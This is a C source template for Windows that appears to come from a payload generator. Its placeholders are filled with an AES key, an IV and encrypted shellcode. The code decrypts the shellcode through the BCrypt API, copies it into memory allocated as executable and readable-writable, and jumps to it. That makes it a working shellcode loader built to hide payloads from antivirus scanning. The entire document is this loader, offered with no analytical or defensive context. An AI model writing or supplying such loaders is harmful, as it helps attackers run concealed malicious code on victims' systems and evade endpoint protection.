#include <windows.h>
#include <bcrypt.h>
#include <stdio.h>

#pragma comment(lib, "bcrypt.lib")

{{key}}

{{iv}}

{{encrypted_shellcode}}

int DecryptShellcode() {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbResult = 0;
    NTSTATUS status;
    DWORD scLen = sizeof(shellcode);

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (status != 0) return -1;

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (status != 0) return -2;

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, sizeof(key), 0);
    if (status != 0) return -3;

    status = BCryptDecrypt(hKey, shellcode, scLen, NULL, iv, sizeof(iv), shellcode, scLen, &cbResult, 0);
    if (status != 0) return -4;

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return 0;
}

int main() {
    if (DecryptShellcode() != 0) {
        printf("[-] Decryption failed\n");
        return 1;
    }

    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();

    return 0;
}